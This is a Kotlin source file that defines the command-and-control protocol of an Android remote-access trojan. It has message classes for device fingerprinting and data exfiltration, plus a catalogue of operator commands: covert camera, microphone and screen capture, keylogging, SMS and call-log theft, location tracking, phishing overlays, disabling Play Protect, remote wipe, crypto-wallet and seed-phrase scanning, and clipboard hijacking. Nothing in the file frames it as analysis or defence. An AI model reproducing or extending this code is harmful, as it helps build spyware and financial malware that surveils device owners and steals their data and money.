package com.xrc.app.c2

import org.json.JSONArray
import org.json.JSONObject

/**
 * C2 command protocol definitions.
 * All commands are serialized as JSON.
 */
sealed class C2Message {
    abstract fun toJson(): JSONObject

    data class Heartbeat(
        val deviceId: String,
        val timestamp: Long = System.currentTimeMillis()
    ) : C2Message() {
        override fun toJson() = JSONObject().apply {
            put("type", "heartbeat")
            put("device_id", deviceId)
            put("timestamp", timestamp)
            put("battery", BatteryInfo())
        }
    }

    data class DeviceInfo(
        val deviceId: String,
        val model: String,
        val manufacturer: String,
        val androidVersion: String,
        val sdk: Int,
        val isRooted: Boolean,
        val isAccessibilityEnabled: Boolean,
        val isAdminActive: Boolean,
        val installedApps: List<String>,
        val permissions: Map<String, Boolean>
    ) : C2Message() {
        override fun toJson() = JSONObject().apply {
            put("type", "device_info")
            put("device_id", deviceId)
            put("model", model)
            put("manufacturer", manufacturer)
            put("android_version", androidVersion)
            put("sdk", sdk)
            put("is_rooted", isRooted)
            put("accessibility_enabled", isAccessibilityEnabled)
            put("admin_active", isAdminActive)
            put("installed_apps", JSONArray(installedApps))
            put("permissions", JSONObject(permissions))
        }
    }

    data class ExfiltrateData(
        val deviceId: String,
        val dataType: String,
        val payload: String,
        val encrypted: Boolean = true
    ) : C2Message() {
        override fun toJson() = JSONObject().apply {
            put("type", "exfiltrate")
            put("device_id", deviceId)
            put("data_type", dataType)
            put("payload", payload)
            put("encrypted", encrypted)
        }
    }

    data class Command(
        val id: String,
        val action: String,
        val params: JSONObject = JSONObject()
    ) : C2Message() {
        override fun toJson() = JSONObject().apply {
            put("type", "command_response")
            put("command_id", id)
            put("status", "received")
        }

        companion object {
            fun fromJson(json: JSONObject): Command? {
                return try {
                    Command(
                        id = json.optString("id", ""),
                        action = json.optString("action", ""),
                        params = json.optJSONObject("params") ?: JSONObject()
                    )
                } catch (e: Exception) {
                    null
                }
            }
        }
    }

    data class BatteryInfo(
        val level: Int = 0,
        val isCharging: Boolean = false,
        val temperature: Float = 0f
    )
}

/**
 * All available C2 command actions.
 */
object C2Actions {
    // Surveillance
    const val START_CAMERA = "start_camera"
    const val STOP_CAMERA = "stop_camera"
    const val START_MIC = "start_mic"
    const val STOP_MIC = "stop_mic"
    const val START_SCREEN_RECORD = "start_screen_record"
    const val STOP_SCREEN_RECORD = "stop_screen_record"
    const val TAKE_SCREENSHOT = "take_screenshot"
    const val START_KEYLOGGER = "start_keylogger"
    const val STOP_KEYLOGGER = "stop_keylogger"
    const val GET_KEYLOGS = "get_keylogs"
    const val START_SCREEN_STREAM = "start_screen_stream"
    const val STOP_SCREEN_STREAM = "stop_screen_stream"

    // SMS & Calls
    const val GET_SMS = "get_sms"
    const val SEND_SMS = "send_sms"
    const val DELETE_SMS = "delete_sms"
    const val GET_CALL_LOGS = "get_call_logs"
    const val START_CALL_RECORD = "start_call_record"
    const val STOP_CALL_RECORD = "stop_call_record"
    const val USSD_DIAL = "ussd_dial"

    // Location
    const val GET_LOCATION = "get_location"
    const val START_GPS_TRACKING = "start_gps_tracking"
    const val STOP_GPS_TRACKING = "stop_gps_tracking"

    // File System
    const val LIST_FILES = "list_files"
    const val READ_FILE = "read_file"
    const val DOWNLOAD_FILE = "download_file"
    const val UPLOAD_FILE = "upload_file"
    const val DELETE_FILE = "delete_file"
    const val SEARCH_FILES = "search_files"
    const val ZIP_FILES = "zip_files"

    // App Management
    const val LIST_APPS = "list_apps"
    const val UNINSTALL_APP = "uninstall_app"
    const val INSTALL_APK = "install_apk"
    const val LAUNCH_APP = "launch_app"
    const val KILL_APP = "kill_app"
    const val GET_FOREGROUND_APP = "get_foreground_app"

    // Overlay (Sprunge)
    const val SHOW_OVERLAY = "show_overlay"
    const val HIDE_OVERLAY = "hide_overlay"
    const val SET_OVERLAY_TARGETS = "set_overlay_targets"
    const val INJECT_HTML = "inject_html"
    const val GET_OVERLAY_STATUS = "get_overlay_status"

    // Permissions
    const val GRANT_PERMISSION = "grant_permission"
    const val CHECK_PERMISSIONS = "check_permissions"
    const val AUTO_GRANT_ALL = "auto_grant_all"
    const val DISABLE_PLAY_PROTECT = "disable_play_protect"
    const val ENABLE_ACCESSIBILITY = "enable_accessibility"

    // Persistence
    const val ACTIVATE_DEVICE_ADMIN = "activate_device_admin"
    const val LOCK_DEVICE = "lock_device"
    const val WIPE_DEVICE = "wipe_device"
    const val FACTORY_RESET = "factory_reset"

    // Wallet & Finance
    const val SCAN_WALLETS = "scan_wallets"
    const val GET_WALLET_DATA = "get_wallet_data"
    const val START_WALLET_MONITOR = "start_wallet_monitor"
    const val STOP_WALLET_MONITOR = "stop_wallet_monitor"
    const val SCAN_SEED_PHRASES = "scan_seed_phrases"
    const val CLIPBOARD_HIJACK = "clipboard_hijack"

    // System
    const val GET_DEVICE_INFO = "get_device_info"
    const val SHELL_COMMAND = "shell_command"
    const val CHANGE_SETTINGS = "change_settings"
    const val REBOOT = "reboot"
    const val SHUTDOWN = "shutdown"
    const val SET_WALLPAPER = "set_wallpaper"
    const val PLAY_SOUND = "play_sound"
    const val TOGGLE_WIFI = "toggle_wifi"
    const val TOGGLE_BLUETOOTH = "toggle_bluetooth"
    const val TOGGLE_FLASHLIGHT = "toggle_flashlight"

    // Accounts
    const val GET_ACCOUNTS = "get_accounts"
    const val GET_CONTACTS = "get_contacts"
    const val NOTIFICATIONS = "get_notifications"

    // Privilege Escalation
    const val ENABLE_DEVELOPER_OPTIONS = "enable_developer_options"
    const val ENABLE_WIRELESS_ADB = "enable_wireless_adb"
    const val START_SHIZUKU = "start_shizuku"
    const val CHECK_ROOT = "check_root"

    // C2 Config
    const val UPDATE_CONFIG = "update_config"
    const val PING = "ping"
    const val DISCONNECT = "disconnect"
}
